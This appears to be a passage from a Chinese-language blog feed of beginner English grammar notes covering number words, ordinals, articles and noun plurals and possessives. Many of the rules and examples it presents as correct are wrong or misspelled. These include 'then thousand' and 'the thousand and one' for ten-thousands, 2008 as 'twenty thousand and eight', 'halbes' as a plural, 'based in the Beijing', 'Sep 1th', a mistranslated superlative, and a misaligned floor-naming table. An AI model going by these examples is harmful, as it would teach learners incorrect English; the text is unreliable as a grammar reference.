<li>序数词</li>
</ul>
<h2 id="基数词"><a href="#基数词" class="headerlink" title="基数词"></a>基数词</h2><h3 id="两位数"><a href="#两位数" class="headerlink" title="两位数"></a>两位数</h3><h4 id="个位-1～9"><a href="#个位-1～9" class="headerlink" title="个位(1～9)"></a>个位(1～9)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>零</th>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
<th>七</th>
<th>八</th>
<th>九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>zero</code></td>
<td><code>one</code></td>
<td><code>two</code></td>
<td><code>three</code></td>
<td><code>four</code></td>
<td><code>five</code></td>
<td><code>six</code></td>
<td><code>seven</code></td>
<td><code>eight</code></td>
<td><code>nine</code></td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h4 id="十到十九-10-19"><a href="#十到十九-10-19" class="headerlink" title="十到十九(10~19)"></a>十到十九(10~19)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>十</th>
<th>十一</th>
<th>十二</th>
<th>十三</th>
</tr>
</thead>
<tbody>
<tr>
<td><font color="#FF0000"><strong><code>ten</code></strong></font></td>
<td><font color="#FF0000"><strong><code>eleven</code></strong></font></td>
<td><font color="#FF0000"><strong><code>twelve</code></strong></font></td>
<td><font color="#FF0000"><strong><code>thirteen</code></strong></font></td>
</tr>
</tbody>
</table>
</div>
<p><strong>后面加<code>teen</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>十四</th>
<th>十五</th>
<th>十六</th>
<th>十七</th>
<th>十八</th>
<th>十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>fourteen</code></td>
<td><code>fifteen</code></td>
<td><code>sixteen</code></td>
<td><code>seventeen</code></td>
<td><code>eighteen</code></td>
<td><code>nineteen</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="整十"><a href="#整十" class="headerlink" title="整十"></a>整十</h4><p><strong>后加<code>ty</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>二十</th>
<th>三十</th>
<th>四十</th>
<th>五十</th>
</tr>
</thead>
<tbody>
<tr>
<td><font color="#FF0000"><strong><code>twenty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>thirty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>forty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>fifty</code></strong></font></td>
</tr>
<tr>
<td><strong>六十</strong></td>
<td><strong>七十</strong></td>
<td><strong>八十</strong></td>
<td><strong>九十</strong></td>
</tr>
<tr>
<td><code>sixty</code></td>
<td><code>seventy</code></td>
<td><code>eighty</code></td>
<td><code>ninety</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="几十几-21-99"><a href="#几十几-21-99" class="headerlink" title="几十几(21~99)"></a>几十几(21~99)</h4><p><strong>十位用整十，个位用个位，两位间用<code>-</code>相连</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>二十一</th>
<th>八十八</th>
<th>九十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twenty-one</code></td>
<td><code>eighty-eight</code></td>
<td><code>ninety-nine</code></td>
</tr>
</tbody>
</table>
</div>
<h3 id="大于两位"><a href="#大于两位" class="headerlink" title="大于两位"></a>大于两位</h3><p><strong>数字表达规则</strong></p>
<ul>
<li>中文划分规则 <code>10,0000,0000</code></li>
<li>英文划分规则 <code>1,000,000,000</code><ul>
<li><strong>从右往左，三位一分</strong>,第一个划分<code>thousand</code>,第二划分<code>million</code>，第三划分<code>billion</code>，第四划分<code>trillion</code></li>
<li>每个个划分间的十位和百位加<code>and</code>，数字隔<code>0</code>加<code>and</code></li>
</ul>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>十亿</th>
<th>亿</th>
<th>千万</th>
<th>百万</th>
<th>十万</th>
<th>万</th>
<th>千</th>
<th>百</th>
<th>十</th>
<th>个</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>billion</code></td>
<td><code>one hundred million</code></td>
<td><code>ten million</code></td>
<td><code>million</code></td>
<td><code>one hundred thousand</code></td>
<td><code>then thousand</code></td>
<td><code>thousand</code></td>
<td><code>hundred</code></td>
<td><code>ten</code></td>
<td><code>one</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="一百到九百九十九-100-999"><a href="#一百到九百九十九-100-999" class="headerlink" title="一百到九百九十九(100~999)"></a>一百到九百九十九(100~999)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>一百 (100)</th>
<th>一百零一 (101)</th>
<th>九百九十九 (999)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>one hundred</code></td>
<td><code>one hundred and one</code></td>
<td><code>nine hundred and ninety-nine</code></td>
</tr>
<tr>
<td></td>
<td>中间有<code>0</code>加<code>and</code></td>
<td>十位百位加<code>and</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="一千到九千九百九十九-1-000-9-999"><a href="#一千到九千九百九十九-1-000-9-999" class="headerlink" title="一千到九千九百九十九(1,000~9,999)"></a>一千到九千九百九十九(1,000~9,999)</h4><p><strong>一 千</strong> (1,00)<br><code>one hundred</code></p>
<p><strong>一 千 零 一</strong> (1,001)<br><code>one tousand and one</code></p>
<p><strong>一 千 零 二十</strong> (1,020)<br><code>one thousand adn twenty</code></p>
<p><strong>九 千 九 百 九十 九</strong> (9,999)<br><code>nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一万到一万零九百九十九-10-000-10-999"><a href="#一万到一万零九百九十九-10-000-10-999" class="headerlink" title="一万到一万零九百九十九 (10,000~10,999)"></a>一万到一万零九百九十九 (10,000~10,999)</h4><p><strong>一 万</strong> (10<code>*</code>1000<code>=</code>10,000)<br><code>ten thousand</code></p>
<p><strong>一 万 零 一</strong> (10,001)<br><code>the thousand and one</code></p>
<p><strong>一 万 零 二十</strong> (10,020)<br><code>the thousand and twenty</code></p>
<p><strong>一 万 零 两 百</strong> (10,200)<br><code>the thousand and two hundred</code></p>
<p><strong>一 万 零 九 百 九十 九</strong> (10,999)<br><code>ten tousand nine hundred and ninety-nine</code></p>
<h4 id="一万一千到九万九千九百九十九-11-000-99-9999"><a href="#一万一千到九万九千九百九十九-11-000-99-9999" class="headerlink" title="一万一千到九万九千九百九十九 (11,000~99,9999)"></a>一万一千到九万九千九百九十九 (11,000~99,9999)</h4><p><strong>一万一千</strong> (11<code>*</code>1000<code>=</code>11,000 )<br><code>eleven thousand</code></p>
<p><strong>一万一千 零一</strong> (11,001)<br><code>eleven thousand and one</code></p>
<p><strong>一万一千 零二十</strong> (11,020)<br><code>elven thousand and twenty</code></p>
<p><strong>一万一千 二百</strong> (11,200)<br><code>eleven thousand two hundred</code></p>
<p><strong>九万九千九百九十九</strong> (99,999)<br><code>ninety nine thousand nine hundred and ninety-nine</code></p>
<h4 id="十万到九十九万九千九百九十九-100-000-999-999"><a href="#十万到九十九万九千九百九十九-100-000-999-999" class="headerlink" title="十万到九十九万九千九百九十九 (100,000~999,999)"></a>十万到九十九万九千九百九十九 (100,000~999,999)</h4><p><strong>十万</strong> (100<code>*</code>1000<code>=</code>100,000)<br><code>one hundred thousand</code></p>
<p><strong>十万 零一</strong> (100,001)<br><code>one hundred thousand and one</code></p>
<p><strong>十万 零 二十</strong> (100,020)<br><code>one hundred thousand and twenty</code></p>
<p><strong>十万 零 二百</strong> (100,200)<br><code>one hundred thousand and two hundred</code></p>
<p><strong>十万 零 二 千 零 一</strong> (102,001)<br><code>one hundred and tow thousand and one</code></p>
<p><strong>九万九千九百九十九</strong> (999,999)<br><code>nine hundred and ninety-nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一百万到九千九百九十九万九千九百九十九-1-000-000-99-999-999"><a href="#一百万到九千九百九十九万九千九百九十九-1-000-000-99-999-999" class="headerlink" title="一百万到九千九百九十九万九千九百九十九 (1,000,000~99,999,999)"></a>一百万到九千九百九十九万九千九百九十九 (1,000,000~99,999,999)</h4><p><strong>一百万</strong> (1,000,000)<br><code>one million</code></p>
<p><strong>一百万 零 一</strong> (1,000,001)<br><code>one million and one</code></p>
<p><strong>一百万 零 一 千</strong> (1,001,000)<br><code>one million and one thousand</code></p>
<p><strong>一百 零 一万</strong> (1,010,000)<br><code>one million and ten thousand</code></p>
<p><strong>九千九百九十九万九千九百九十九</strong> (99,999,999)<br><code>ninety-nine million nine hundred and ninety-nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一亿到十亿及更多-100-000-000-1-000-000-000-∞"><a href="#一亿到十亿及更多-100-000-000-1-000-000-000-∞" class="headerlink" title="一亿到十亿及更多 (100,000,000~1,000,000,000~∞)"></a>一亿到十亿及更多 (100,000,000~1,000,000,000~∞)</h4><p><strong>一亿</strong> (100,000,000)<br><code>one hundred million</code></p>
<p><strong>一亿 零 一</strong> (100,000,001)<br><code>one hundred million and one</code></p>
<p><strong>一亿 零 一 千</strong> (1000,001,000)<br><code>one hundred million and one thonsand</code></p>
<p><strong>一亿 零 一百万</strong> (101,000,000)<br><code>one hundred and one million</code></p>
<p><strong>三百一十亿零两千九十万零八百八十八</strong> (31,020,900,888)<br><code>thirty-one billion twenty million nine hundred thousand eight hundred and eight-eight</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li><p>作数词时，前加了数词，后面就不能加<code>s</code><br><code>two thousand</code> (√)<br><code>three thousands</code> (×)</p>
</li>
<li><p>如果数词作名词时，变成主语或别的什么成分，意识是<code>好几..</code>的时候，前面可加<code>some</code>、<code>many</code>、<code>several</code>等这词或加数词，后面可以加<code>of</code><br><code>hundreds of</code> (好几百)<br><code>five hundreds of</code> (五百左右)<br><code>many millions of</code> (数百万)</p>
</li>
<li><p>表年龄<br><code>I&#39;m twenty</code> (我20岁)</p>
</li>
<li><p>表编号<br><code>Room 101</code> = <code>Room one 0 one</code> (101房间)<br><code>Bus No.10</code> = <code>Bus Number ten</code> (10路公交车)</p>
</li>
<li><p>表年代<br><code>1940&#39;s</code> = <code>nineteen forty&#39;s</code> (20世纪40年代)</p>
</li>
<li><p>表年份<br><code>2008</code> = <code>twenty thousand and eight</code><br><code>1949</code> = <code>nineteen forty-nine</code></p>
</li>
<li><p>表时刻</p>
<p><strong>中国人描述实践习惯精确到个位分钟，外国人描述实践习惯精确到十位分钟，几分钟一般省略</strong></p>
<p><code>6:00</code> = <code>six o&#39;clock</code> = <code>six on the dot</code> (6点整)</p>
<p><code>6:05</code> = <code>six o five</code> = <code>five past six</code> (6点05分，6点过5分)</p>
<p><code>6:15</code> = <code>six fifteen</code> = <code>a quarter past six</code> (6点15分，6点一刻)</p>
<p><code>6:30</code> = <code>six thirty</code> = <code>half past six</code> (6点30分，六点半)</p>
<p><code>6:45</code> = <code>six forty-five</code> = <code>aquarter to (till) seven</code> (6点45分，七点差一刻)</p>
<p><code>6:55</code> = <code>six fifty-five</code> = <code>five to (till) seven</code> (6点55分，7点差五分)</p>
</li>
</ul>
<p>  <strong>时区：<code>aones</code></strong></p>
<p>  <strong>上午：<code>ante meridiem</code> = <code>a.m.</code></strong></p>
<p>  <strong>下午：<code>post meridiem</code> = <code>p.m.</code></strong></p>
<p>  24小时制 = <code>24-hour clock</code> = <code>military time</code><br>  (北美不使用24小时制，都是说12小时制加<code>a.m.</code>和<code>p.m.</code>)</p>
<p>  <code>21:00</code> = <code>twenty one hours</code></p>
<p>  <code>21:20</code> = <code>twenty one twenty</code></p>
<ul>
<li><p>电话号码直接读数字<br>(北美电话，区号(3)+用户号(7))<br><code>647-300-2516</code> = <code>six four seven-three double o-two five one six</code></p>
<p>两连续的<code>0</code>可读成<code>double o</code>代替</p>
</li>
<li><p>价格(经常省略<code>dollars</code>和<code>cents</code>)<br><code>nine thirty</code> = <code>nine dollars and thirty cents</code> (9.30$)<br><code>ninety-nine ninety-eifht</code> = <code>ninety-nine dollars and ninety-eight cents</code> (99.98$)</p>
</li>
<li><p>小数(经常省略<code>zero</code>,或读成<code>o</code>)<br><code>0.5</code> = <code>(zero) point five</code> (零点五)<br><code>0.05</code> = <code>zero point o five</code> (零点零五)</p>
</li>
<li><p>两一样数字，三一样数字 (double,triple)<br><code>007</code> = double o seven (零零七)<br><code>boeing 777</code> = <code>boeing triple seven</code> (波音777)</p>
</li>
</ul>
<h1 id="序数词"><a href="#序数词" class="headerlink" title="序数词"></a>序数词</h1><h2 id="第零到第九"><a href="#第零到第九" class="headerlink" title="第零到第九"></a>第零到第九</h2><p><strong>基数词后加<code>th</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第零</th>
<th>第一</th>
<th>第二</th>
<th>第三</th>
<th>第四</th>
<th>第五</th>
<th>第六</th>
<th>第七</th>
<th>第八</th>
<th>第九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>zeroth</code></td>
<td><font color="#FF0000"><strong><code>first</code></strong></font></td>
<td><font color="#FF0000"><strong><code>second</code></strong></font></td>
<td><font color="#FF0000"><strong><code>third</code></strong></font></td>
<td><code>fourth</code></td>
<td><font color="#FF0000"><strong>fifth</strong></font></td>
<td>sixth</td>
<td>seventh</td>
<td>eighth</td>
<td><font color="#FF0000"><strong><code>ninth</code></strong></font></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第十到第十九"><a href="#第十到第十九" class="headerlink" title="第十到第十九"></a>第十到第十九</h2><p><strong>基数词后加<code>th</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第十</th>
<th>第十一</th>
<th>第十二</th>
<th>第十三</th>
<th>第十四</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tenth</code></td>
<td><code>eleventh</code></td>
<td><font color="#FF0000"><strong><code>twelfth</code></strong></font></td>
<td><code>thirteenth</code></td>
<td><code>fourteenth</code></td>
</tr>
<tr>
<td><strong>第十五</strong></td>
<td><strong>第十六</strong></td>
<td><strong>第十七</strong></td>
<td><strong>第十八</strong></td>
<td><strong>第十九</strong></td>
</tr>
<tr>
<td><code>fifteenth</code></td>
<td><code>sixteenth</code></td>
<td><code>seventeenth</code></td>
<td><code>eghteenth</code></td>
<td><code>nineteenth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第整十"><a href="#第整十" class="headerlink" title="第整十"></a>第整十</h2><p><strong>吧基数词结尾的<code>y</code>变成<code>i</code>再加<code>eth</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第二十</th>
<th>第三十</th>
<th>第四十</th>
<th>第五十</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twentieth</code></td>
<td><code>thirtieth</code></td>
<td><code>fortieth</code></td>
<td><code>fiftieth</code></td>
</tr>
<tr>
<td><strong>第六十</strong></td>
<td><strong>第七十</strong></td>
<td><strong>第八十</strong></td>
<td><strong>第九十</strong></td>
</tr>
<tr>
<td><code>sixtieth</code></td>
<td><code>seventieth</code></td>
<td><code>eightieth</code></td>
<td><code>ninetieth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第几十几"><a href="#第几十几" class="headerlink" title="第几十几"></a>第几十几</h2><p><strong>十位用基数词，个位用序数词</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第二十一</th>
<th>第九十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twenty first</code></td>
<td><code>ninety ninth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="一百及以上"><a href="#一百及以上" class="headerlink" title="一百及以上"></a>一百及以上</h2><p><strong>第整十的后面加<code>th</code>,如果不是整十，保留基数词只变个位数</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第一百</th>
<th>第一千</th>
<th>第一百万</th>
<th>第十亿</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>one hundredth</code></td>
<td><code>one thousandth</code></td>
<td><code>one million</code></td>
<td><code>one billion</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>第十亿五千万零三十一</strong> (1,050,000,031st)<br><code>one billion fifty million and third first</code></p>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><ul>
<li><p><strong>使用词时，一般前面要加定冠词<code>the</code></strong></p>
<p><code>I&#39;m in the second room</code> (我在第二个房间)</p>
</li>
<li><p>表时间日期<br><code>The first of September</code> = <code>Sep 1st</code> (九月一日)</p>
</li>
<li><p>表楼层<br><code>The first floot</code> (一楼)</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>说法</th>
<th>三楼（G3）</th>
<th>二楼（G2）</th>
<th>一楼（G1）</th>
<th>地下一层（B1）</th>
<th>地下二层（B2）</th>
<th>地下三层（B3）</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>英式</strong></td>
<td><code>Second floor</code></td>
<td><code>First floor</code></td>
<td><code>Ground floor</code></td>
<td><code>First basement</code></td>
<td><code>Second basement</code></td>
<td><code>Third basement</code></td>
</tr>
<tr>
<td><strong>美式</strong></td>
<td><code>Third floor</code></td>
<td><code>Second floor</code></td>
<td><code>First basement</code></td>
<td><code>Second basement</code></td>
<td><code>Third basement</code></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>分数<br><strong>分子大于一，分母用复数形式</strong></li>
</ul>
<p><code>one third</code> = <code>1/3</code><br><code>two thirds</code> = <code>2/3</code></p>
<ul>
<li><p>序数词前加<code>a</code>/<code>an</code>表示再次，序数词前加<code>the</code>表顺序</p>
<p><code>We read the book a third times</code> (我们读了三边这本书)</p>
<p><code>The second door of the room is closed</code> (房间的第二扇门是关的)</p>
</li>
</ul>
<h1 id="冠词"><a href="#冠词" class="headerlink" title="冠词"></a>冠词</h1><p><strong>加在名词前的<code>a</code>、<code>an</code>、<code>the</code>想成特指或泛指的作用</strong></p>
<ul>
<li>点冠词 (特指)</li>
<li>不定冠词 (泛指)</li>
<li>零冠词</li>
</ul>
<h2 id="定冠词-the"><a href="#定冠词-the" class="headerlink" title="定冠词(the)"></a>定冠词(<code>the</code>)</h2><p><strong>表示这个/那个，特指某个名词，后面跟单/复数名词、不可数名词</strong></p>
<ul>
<li><p>表上文提到过的人或物<br><code>This car is popular,but the car isn&#39;t cheap</code> (这车很热门，但这车不便宜)</p>
</li>
<li><p>表地理位置<br><code>We are based in the Beijing</code> (我们的总部设在北京)</p>
</li>
<li><p>表江河湖海<br><code>The Yellow River</code> (黄河)</p>
</li>
<li><p>唯一存在的事物<br><code>The earth</code></p>
</li>
<li><p>最高级前<br><code>This is the best cup of coffee</code> (这是最后的一杯咖啡)</p>
</li>
<li><p>表强调时<br><code>Beijing is the capital of China</code> (北京是中国的首都)</p>
</li>
<li><p>乐器<br><code>I like to play the piano</code> (我喜欢弹钢琴)</p>
</li>
</ul>
<h2 id="不定冠词-a、an"><a href="#不定冠词-a、an" class="headerlink" title="不定冠词 (a、an)"></a>不定冠词 (<code>a</code>、<code>an</code>)</h2><p><strong>泛指人或物，表示一个，不知道具体是哪一个，后面加单数可数名词</strong></p>
<p><strong>辅音前加<code>a</code>，元音前加<code>an</code></strong></p>
<blockquote>
<p>元音：<br>[a]、[e]、[i]、[o]、[u]<br>元音字母：a、e、i、o、y<br>辅音：<br>除元音外的都是辅音</p>
</blockquote>
<p><strong>大多数情况可直接可直接通过字母判断是元音还是辅音，但还有些开头的不是元音字母却发元音的</strong></p>
<ul>
<li><p>第一次提到的人或物<br><code>It&#39;s a cat</code> (这是一只猫)</p>
</li>
<li><p>对唯一事物具体情况说明<br><code>Their dream is to go on a world tour</code> (他们的梦想是去全世界巡回演出)</p>
</li>
<li><p>和名词连用表语做同位语，代表职业<br><code>I am an engineer</code> (我是一个工程师)</p>
</li>
<li><p>表价格、速度、频率<br><code>80 miles an hour</code> (80 英里每小时)</p>
</li>
<li><p>国定短语<br><code>have a good time</code> (玩得开心)</p>
</li>
</ul>
<h2 id="零冠词-不加冠词"><a href="#零冠词-不加冠词" class="headerlink" title="零冠词 (不加冠词)"></a>零冠词 (不加冠词)</h2><ul>
<li><p>很广泛的概念<br><code>Sichuan dishes are spicy</code> (四川菜很辣)</p>
</li>
<li><p>书名、人名<br><code>I am reading &quot;Journey to the West&quot;</code> (我正在读西游记)</p>
</li>
<li><p>某些城市、国家<br><code>China is a big country</code> (中国是一个大国)</p>
</li>
<li><p>某些山河湖海<br><code>Asia</code> (亚洲)</p>
</li>
<li><p>星球<br><code>Mars</code> (火星)</p>
</li>
<li><p>语言、球类、学科、棋牌<br><code>I have studied English for ten years</code> (我学了十年英语)</p>
</li>
<li><p>三餐、日期、季节(一般不加冠词，如果要特指可加<code>the</code>)<br><code>It&#39;s September 1th</code> (这是九月一日)</p>
</li>
</ul>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><font color="#FF0000">**冠词不能和代词连用**</font>

<p><code>This car is popular</code> (√)<br><code>This the car is popular</code> (×)<br>(这车很热门)</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day03</title>
    <url>/posts/45940db/</url>
    <content><![CDATA[<h1 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h1><p><strong>花式加<code>s</code></strong></p>
<ul>
<li>专有名词、普通名词</li>
<li>可数名词、不可数名词</li>
<li>具体名词、抽象名词</li>
</ul>
<h2 id="专有名词"><a href="#专有名词" class="headerlink" title="专有名词"></a>专有名词</h2><p>专有名词(大多数为不可数名词，在某些情况下可以复数使用，或转换为普通名词，单/复数使用)</p>
<a id="more"></a>
<p>人名、地名、国家、组织、单位、大型活动、著名事件等（首字母大写、若果缩写全部字母大写）</p>
<p>人名： Jack<br>地名： Beijing<br>国家： China<br>组织： CBA<br>单位： Department of Education<br>大型活动： Midi Festival<br>署名事件： Discovery of America</p>
<p>普通名词：专有名词以为的名词</p>
<p>有些情况下专有名词可复数使用(在一个范围内能被数清)，也可转换成普通名词(加不定冠词变成普通名词)</p>
<p><code>There are two Jacks in our class</code> (我们班有两个杰克)</p>
<p><code>Millions off Lei Fengs have emerged in China</code> (中国出现了数百万的活雷锋)</p>
<p><code>Hey,Tom,have a Mrs. Carl is waiting for you</code> (嘿，汤姆，有一位卡尔夫人正在等你)</p>
<h2 id="可数名词、不可数名词"><a href="#可数名词、不可数名词" class="headerlink" title="可数名词、不可数名词"></a>可数名词、不可数名词</h2><ul>
<li><p>可数名词(单数复数都可以，可以加数词计算的)</p>
<p><code>apple</code>、<code>egg</code>、<code>boy</code>、<code>tree</code>、<code>family</code>、<code>class</code>、<code>police</code>、<code>team</code>等</p>
</li>
<li><p>不可数名词(只能单数，不可以加数词计算)</p>
<p><code>water</code>、<code>fire</code>、<code>time</code>、<code>hope</code>、<code>knowledge</code>、<code>intelligence</code>等</p>
</li>
</ul>
<h2 id="具体名词、抽象名词"><a href="#具体名词、抽象名词" class="headerlink" title="具体名词、抽象名词"></a>具体名词、抽象名词</h2><ul>
<li><p>具体名词(看得见摸得着，可数不可数都有)</p>
<p><code>man</code>、<code>Beijing</code>、<code>book</code>、<code>car</code>、<code>water</code>、<code>fire</code>等</p>
</li>
<li><p>抽象名词(无形的各种事物，大多数是不可数)</p>
<p><code>time</code>、<code>hope</code>、<code>knowledge</code>、<code>love</code>、<code>anger</code>等</p>
</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>可数名词<strong><font color="#ff0000">能</font></strong>计数</li>
<li>可数名词<strong><font color="#ff0000">能</font></strong>加不定冠词 (a/an) 和数词 (one、two等)</li>
<li><p>可数名词<strong><font color="#ff0000">可以</font></strong>加定冠词 (the)</p>
</li>
<li><p>不可数名词<strong><font color="#ff0000">不能</font></strong>计数</p>
</li>
<li>不可数名词<strong><font color="#ff0000">不能</font></strong>加不定冠词 (a/an) 和数词 (one、two)</li>
<li>不可数名词<em>可以</em>加定冠词 (the)</li>
</ul>
<h2 id="名词单复数变化"><a href="#名词单复数变化" class="headerlink" title="名词单复数变化"></a>名词单复数变化</h2><h3 id="规则变化"><a href="#规则变化" class="headerlink" title="规则变化"></a>规则变化</h3><ul>
<li><p>大多数名词，直接加<code>s</code><br><code>day</code> ==&gt; <code>days</code></p>
</li>
<li><p>以<code>o</code>、<code>s</code>、<code>x</code>、<code>ch</code>、<code>sh</code>结尾的加<code>es</code><br><code>hero</code> ==&gt; <code>heroes</code></p>
</li>
<li><p>辅音+<code>y</code>，变<code>y</code>为<code>i</code>加<code>es</code><br><code>city</code> ==&gt; <code>cities</code></p>
</li>
<li><p>元音 <strong>+</strong> <code>y</code>，加<code>s</code><br><code>boy</code> ==&gt; <code>boys</code></p>
</li>
<li><p><code>f</code>或<code>fe</code>结尾，变<code>f</code>为<code>v</code>加<code>es</code> 或直接加<code>s</code><br><code>half</code> ==&gt; <code>halbes</code> ; <code>roof</code> ==&gt; <code>roofs</code></p>
</li>
<li><p><code>ch</code>结尾发<code>/k/</code>,直接加<code>s</code><br><code>stomach</code> ==&gt; <code>stomachs</code></p>
</li>
<li><p>辅音 <strong>+</strong> <code>oo</code>结尾加<code>s</code><br><code>bamboo</code> ==&gt; <code>bamboos</code></p>
</li>
<li><p>辅音 <strong>+</strong> <code>o</code>，加<code>es</code><br><code>echo</code> ==&gt; <code>echoes</code></p>
</li>
<li><p><code>volcano</code>、<code>mango</code>、<code>banjo</code>、<code>grotto</code>、<code>halo</code>、<code>archipelago</code> 加<code>es</code>和<code>s</code>都可以</p>
</li>
</ul>
<h3 id="不规则变化"><a href="#不规则变化" class="headerlink" title="不规则变化"></a>不规则变化</h3><p>常见：<br><code>man</code> ==&gt; <code>men</code><br><code>woman</code> ==&gt; <code>women</code><br><code>goose</code> ==&gt; <code>geese</code><br><code>foot</code> ==&gt; <code>feet</code><br><code>tooth</code> ==&gt; <code>teeth</code><br><code>child</code> ==&gt; <code>children</code><br><code>mouse</code> ==&gt; <code>mice</code><br><code>fish</code> ==&gt; <code>fish</code><br><code>sheep</code> ==&gt; <code>sheep</code><br><code>deer</code> ==&gt; <code>deer</code></p>
<h3 id="一直是复数的"><a href="#一直是复数的" class="headerlink" title="一直是复数的"></a>一直是复数的</h3><p><code>scissors</code> (剪刀)<br><code>tweezers</code> (镊子)<br><code>glasses</code> (眼镜)<br><code>congratulations</code> (祝贺)<br><code>clothes</code> (衣服)<br><code>trousers</code> (裤子)<br><code>amends</code> (赔偿)<br><code>shenanigans</code> (恶作剧)<br><code>cahoots</code> (同伙)<br><code>smithereens</code> (碎片)</p>
<h3 id="复合名词-两名词合在一起"><a href="#复合名词-两名词合在一起" class="headerlink" title="复合名词 (两名词合在一起)"></a>复合名词 (两名词合在一起)</h3><ul>
<li><p>不可数名词结尾，无复数形式<br><code>homework</code>、<code>nwespaper</code>、<code>greenhouse</code></p>
</li>
<li><p><code>man</code>或<code>woman</code>做前缀，前后都变复数<br><code>man actor</code> ==&gt; <code>men actors</code></p>
</li>
<li><p>两个名词，后面变复数<br><code>boy friend</code> ==&gt; <code>boy fiends</code></p>
</li>
<li><p>可数名词 <strong>+</strong> 介词(短语) ，前面名词复数<br><code>sister in law</code> ==&gt; <code>sisters in law</code></p>
</li>
<li><p>动词/过去分词 <strong>+</strong> 副词，加<code>s</code><br><code>stand by</code> ==&gt; <code>stand bys</code></p>
</li>
</ul>
<h2 id="名词所有格"><a href="#名词所有格" class="headerlink" title="名词所有格"></a>名词所有格</h2><h3 id="39-s所有格，中英-语序一样"><a href="#39-s所有格，中英-语序一样" class="headerlink" title="&#39;s所有格，中英 语序一样"></a><code>&#39;s</code>所有格，中英 语序一样</h3><ul>
<li><p>单数名词/复数名词非<code>s</code>结尾，后加<code>&#39;s</code>，单数名词<code>s</code>结尾，后加<code>&#39;s</code><br>Jack’s (杰克的)<br>The boss’s car (老板的车)</p>
</li>
<li><p>复数名词<code>s</code>结尾，后加<code>&#39;</code><br><code>Boys&#39;</code> (男孩的)</p>
</li>
<li><p>用<code>and</code>连接并列名词时</p>
<ul>
<li>表示各自所有关系，分别加<code>&#39;s</code></li>
<li>共同所有关系，只在最后一个名词加<code>&#39;s</code><br>Tom’s and Jack’ rooms (汤姆的房间和杰克的房间)<br>Tom and Jack’s room (汤姆和杰克的房间)</li>
</ul>
</li>
<li><p>其他常见用法</p>
<ul>
<li><p>日程时间后<br><code>3 day&#39; holiday</code> (3天的假期)</p>
</li>
<li><p>国家城市后<br><code>Beijing&#39;s policy</code> (北京的政策)</p>
</li>
<li><p>地方机构后<br><code>The airport&#39;s service guide&#39;</code> (机场的服务指南)</p>
</li>
<li><p>各种单位后<br><code>100 kilogram&#39;s weight</code> (100千克的重量)</p>
</li>
<li><p>天体后<br><code>The Jupiter&#39;s aura</code> (木星的光环)</p>
</li>
</ul>
</li>
</ul>
<h3 id="of所有格，中英-语序相反"><a href="#of所有格，中英-语序相反" class="headerlink" title="of所有格，中英 语序相反"></a><code>of</code>所有格，中英 语序相反</h3><p>  修饰前面的名词，表两个名词间的所属关系<br>  <code>The content of the book</code> = <code>The book&#39;s content</code> (这本书的内容)</p>
<h3 id="s-of双重所有格"><a href="#s-of双重所有格" class="headerlink" title="s+of双重所有格"></a><code>s</code>+<code>of</code>双重所有格</h3><ul>
<li><p><code>of</code> <strong>+</strong> 名词<code>&#39;s</code>所有格<br><code>This is a photo of my cat&#39;s</code> (这是我猫的照片)</p>
</li>
<li><p><code>of</code> <strong>+</strong> 名词性物主代词<br><code>He is a friend of mine</code> (他是我的朋友)</p>
</li>
</ul>
<h2 id="名词主谓一致"><a href="#名词主谓一致" class="headerlink" title="名词主谓一致"></a>名词主谓一致</h2><p>  主谓一致：主语的单复数和谓语的单复数保持一致</p>
<p>  <code>I(单) am(单) student.</code> (我是学生)</p>
<p>  <code>They(复) are(复) students</code> (他们是学生)</p>
<ul>
